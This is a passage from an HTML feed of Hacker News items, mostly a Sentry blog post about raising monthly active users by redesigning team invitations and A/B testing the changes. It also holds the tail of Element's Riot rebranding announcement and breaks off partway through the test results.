recovery passphrase when setting up E2EE for the first time (the next phase is to delay setting up E2EE until the user actually starts talking in encrypted rooms).</p><figure><img src="https://element.io/blog/content/images/2020/07/Screenshot-2020-07-15-at-00.54.45.png"></figure><p>So there you have it. Welcome to a whole new beginning for Riot: welcome to your new Element, one where mainstream Matrix users will enjoy themselves too - and which will pave the way for wider adoption of open, secure, decentralised communication via Matrix throughout the world.</p><p>- Matthew, Amandine, and the whole Element team.</p><p>P.S. Check out our <a href="https://element.io/">all-new website</a> and in particular the <a href="https://element.io/previously-riot">migration page</a> for much more information about our brave new world!<br></p></div></div>]]>
            </description>
            <link>https://element.io/blog/welcome-to-element/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842179</guid>
            <pubDate>Wed, 15 Jul 2020 07:07:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we grew Sentry's monthly active users by rethinking invitations]]>
            </title>
            <description>
<![CDATA[
Score 112 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23841049">thread link</a>) | @bentlegen
<br/>
July 14, 2020 | https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations | <a href="https://web.archive.org/web/*/https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><time datetime="2020-02-12T00:00">February 12, 2020</time><div><p>At its core, Sentry is a tool that alerts you to defects in your production software. But it does more than blast stack traces into your inbox: Sentry provides powerful workflows to help your team determine root cause, <a href="https://blog.sentry.io/2019/02/07/sentry-workflow-triage">triage issues</a> to your team, and keep tabs on ongoing concerns with comments and notifications.</p>
<p>These collaborative features can help you resolve problems with your software quickly. But the keyword here is <strong>collaborative</strong>; without your full team having access to Sentry, you may find yourself quickly becoming overwhelmed with an endless backlog of issues and no one to help.</p>
<p>At the end of 2019, the Growth team made it our mission to make it easier for our users to invite their teammates to join them on Sentry. To achieve this, we tackled three distinct areas:</p>
<ol>
<li>Surfacing the ability to invite users contextually</li>
<li>Expanding Sentry‚Äôs permission model to allow <em>more types of users</em> to send invitations </li>
<li>Allowing external users to request access themselves</li>
</ol>
<p>Our theory: improving the user experience of inviting users, <em>as well as</em> democratizing the process to include all team members would lead to a significant increase in team-wide adoption. <em>(Narrator: it did.)</em></p>
<h2 id="the-status-quo"><a href="#the-status-quo" aria-label="the status quo permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>The status quo</h2>
<p>Before we get deep into what we changed and how it impacted the bottom line, let‚Äôs quickly revisit how user invitations worked: the <em>Add Member to Organization</em> page you see below.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=233 233w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=465 465w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=930 930w" sizes="(max-width: 800px) 100vw, 800px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=233 233w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=465 465w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=930 930w" sizes="(max-width: 800px) 100vw, 800px">
          <img alt="1-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>This full-page experience, tucked away deep in Sentry‚Äôs account settings, had a number of issues:</p>
<ol>
<li>Since this is a full page, reaching it meant you would be taken out of context of whatever you were doing previously</li>
<li>Its location deep in our navigation hierarchy meant discoverability was poor</li>
<li>It‚Äôs <em>unclear</em> you can actually invite multiple people at once (you can!)</li>
<li>When inviting multiple users, you could only assign the group to the same role and collection of teams</li>
</ol>
<p>Interestingly, to improve discoverability, we had previously introduced a number of ‚Äúquick links‚Äù to reach this page more easily. But these links were scattered around the application, and didn‚Äôt appear contextually when users signaled intent to invite members.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4xiHp1Gl0HaZ0l8USGDPLr/79402583357d98cf55ad2dfda6ffe537/2-invitations.png" alt="" title="2-invitations"></p></figure><div>
<p>These user experience and discovery challenges felt like obvious starting places. But instead of just settling for a new ‚Äúimproved‚Äù form, we decided to rethink the entire experience from the ground up.</p>
<h2 id="the-new-member-invitation-modal"><a href="#the-new-member-invitation-modal" aria-label="the new member invitation modal permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>The new member invitation modal</h2>
<p>It‚Äôs probably not a surprise that our first instinct was to convert this page into a modal ‚Äì&nbsp;one that manages to squeeze all of the capabilities shown earlier into a smaller, more concise experience. It actually does one better: the modal is clearer in indicating that you can invite multiple users, and allows you to set unique permissions for each invitee.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=190 190w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=381 381w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=761 761w" sizes="(max-width: 761px) 100vw, 761px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=190 190w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=381 381w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=761 761w" sizes="(max-width: 761px) 100vw, 761px">
          <img alt="3-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>While modals are sometimes overused in web applications, we believed this approach would solve our key discoverability and navigation concerns: it can be shown contextually without leaving the current page, and completing the form returns you to what you were doing.</p>
<p>To that point, we additionally introduced buttons to launch this <em>Invite New Members</em> modal contextually throughout Sentry:</p>
<ul>
<li>Viewing an issue and notice a <a href="https://docs.sentry.io/workflow/releases/?platform=node#after-associating-commits">suspect commit</a> made by a coworker? If they‚Äôre not already part of your Sentry organization, you can now invite them then and there.</li>
<li>Trying to assign an issue to a team member, but don‚Äôt see their name in the assignee list? You now have the option to invite them right in the dropdown.</li>
<li>Creating a new team? Now you can invite new members directly to that team as you go.</li>
</ul>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/60GpNeFNg4toier5a02zh4/ba868de307b0dcc6764805901b0b6e93/4-invitations.png" alt="" title="4-invitations"></p><figcaption><p>Example contextual link that launches the Invite New Members modal</p></figcaption></figure><div>
<h2 id="democratizing-invitations"><a href="#democratizing-invitations" aria-label="democratizing invitations permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Democratizing invitations</h2>
<p>As we began rolling out our new <em>Invite New Members</em> experience across the application, we came to a sobering realization: only roughly <strong><em>half</em></strong> of Sentry users could actually use our new modal. That‚Äôs because historically, only those with Owner or Manager-level permissions could invite other team members. Combined, users with these permissions accounted for less than 50% of active users.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=123 123w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=245 245w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=490 490w" sizes="(max-width: 490px) 100vw, 490px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=123 123w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=245 245w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=490 490w" sizes="(max-width: 490px) 100vw, 490px">
          <img alt="5-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>Restricting the ability to add new users to account administrators is pretty common practice for software tools, and Sentry is no exception. When an employee onboards on a new team, it‚Äôs common to see an exchange like this:</p>
<blockquote>
<p>Alice: Oh awesome, we use Sentry. Can you add me to the organization?
Bob: Ah, I can‚Äôt invite you. Maybe ask Jen?</p>
</blockquote>
<p>In a perfect world, one of your administrators is tracked down, and they manually add the new teammate to the account. But sometimes that person is unknown, or is on a vacation, or maybe it takes them days or weeks or even months.</p>
<p>We began asking ourselves: what if we could unlock team members to fast-track this whole process and invite members themselves? This led to our next major change: updating our permission model to allow for <strong>members to request to invite other members.</strong></p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=185 185w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=369 369w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=738 738w" sizes="(max-width: 738px) 100vw, 738px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=185 185w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=369 369w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=738 738w" sizes="(max-width: 738px) 100vw, 738px">
          <img alt="6-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a>  </p>
<p>Now, when non-administrators open up the Invite New Members modal, it changes contextually to become a ‚Äúrequest to invite‚Äù rather than a direct invitation. Hitting ‚Äúsend‚Äù kicks off an email to all organization administrators, who are prompted to approve any outstanding requests.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4oi9gYhVX185djAJWppP3Q/ff565fcd34cf00c3a60a32c5ec0cde7b/7-invitations.png" alt="" title="7-invitations"></p><figcaption><p>Organization owners and managers can see pending invitation requests.</p></figcaption></figure><div>
<p>At this point, we had built what we thought was a fantastic new user experience and we just <em>doubled</em> the number of users who could take advantage of it. But this exercise of opening up user invitations got us thinking: what if there was an even <em>further</em> source of untapped users we weren‚Äôt reaching?</p>
<h2 id="removing-the-middleman-entirely"><a href="#removing-the-middleman-entirely" aria-label="removing the middleman entirely permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Removing the middleman entirely</h2>
<p>In the last section, we highlighted a scenario where one teammate asks another teammate for access to Sentry. And because of our recent changes, users can request to invite their teammates themselves instead of having to track down and ask their account administrator.</p>
<p>But this scenario still has a gatekeeping element: the new teammate has to ask <em>another</em> teammate for access. What if the new teammate spots an alert from Sentry in Slack stemming from their recent changes, and no one‚Äôs around to grant them access? Unfortunately, they‚Äôd land on an authentication wall that would prevent them from going any further.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=112 112w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=225 225w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=449 449w" sizes="(max-width: 449px) 100vw, 449px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=112 112w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=225 225w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=449 449w" sizes="(max-width: 449px) 100vw, 449px">
          <img alt="8-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>This begged the question: was there an untapped source of potential users we weren‚Äôt reaching by restricting invitations <em>only</em> to active Sentry users? What if new users didn‚Äôt have to ask anyone at all?</p>
<p>So, to keep this party going, we dug in and additionally made it possible for <strong>external users to request to join an organization</strong>.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/6mRCkcVZkkAlZ0ELzWUGHr/3123b1113330661bc7ee5023aa5ef54c/9-invitations.png" alt="" title="9-invitations"></p><figcaption><p>The ‚ÄúRequest to Join‚Äù button has been added to the organization login page, allowing</p></figcaption></figure><div>
<p>Now when a user lands on an Organization‚Äôs login page, they have the option to ‚ÄúRequest to join‚Äù, which asks for the user‚Äôs name and email address. Once they hit send, the organization owners are sent an email that prompts them to approve the join request. Just in case, there‚Äôs also a call-to-action to disable the feature entirely for their organization.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=165 165w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=330 330w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=660 660w" sizes="(max-width: 660px) 100vw, 660px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=165 165w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=330 330w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=660 660w" sizes="(max-width: 660px) 100vw, 660px">
          <img alt="10-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>Having developed a new contextual invitation modal and a pair of invite-friendly permission changes, we were <em>feeling</em> confident that these changes were going to have a strong impact on user behavior. It was time now to put our money where our code was, and verify that all this hard work actually moved the needle.</p>
<h2 id="ab-testing-the-impact"><a href="#ab-testing-the-impact" aria-label="ab testing the impact permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>A/B testing the impact</h2>
<p>Our standard procedure for validating the efficacy of product changes is through A/B testing (also known as split testing). This means instrumenting our application code to serve different experiences to segments of users over the same time period, and comparing the results. This step takes extra effort, but it‚Äôs worth it ‚Äì&nbsp;the alternative is to settle for a before-and-after snapshot of data, which is too easily impacted by external factors like seasonality or marketing pushes.</p>
<p>‚ÑπÔ∏è <em>To learn more about how we perform A/B testing at Sentry, please see <a href="https://blog.sentry.io/2019/05/09/easy-ab-testing-with-planout">this earlier blog post</a>.</em></p>
<p>It‚Äôs easy to get carried away with A/B testing, and having so many permutations that you don‚Äôt have enough data to be statistically significant. So, to simplify things, we decided that all treatments would get the new modal experience, and our ‚Äútreatment‚Äù groups would focus on the new permission changes.</p>
<p>This left us with 4 distinct treatments that we rolled out to 4 equally-sized customer segments:</p>
<ol>
<li><strong>Baseline</strong> (new modal only)</li>
<li><strong>Request to Invite</strong> (user invites another user)</li>
<li><strong>Request to Join</strong> (external user requests to join)</li>
<li><strong><em>Both</em></strong> Request to Invite and Request to Join are enabled together</li>
</ol>
<p>Our main criteria for determining success: which of these treatments would result in <strong>an increase in <em>accepted</em> invitations</strong> (and thus new users)?</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/rlobEVJ4FCzWbU1tmPqqb/8ed779f9a63aa3382e5590cfa8e4bec1/11-invitations_2_.png" alt="" title="11-invitations"></p><figcaption><p>% of accepted invitations relative to baseline</p></figcaption></figure><div>
<p>After 30 days, the results became clear (not to mention, statistically significant):</p>
<ul>
<li><strong>11%</strong> more users accepted invitations in the <em>Request to Invite</em> treatment vs. the baseline</li>
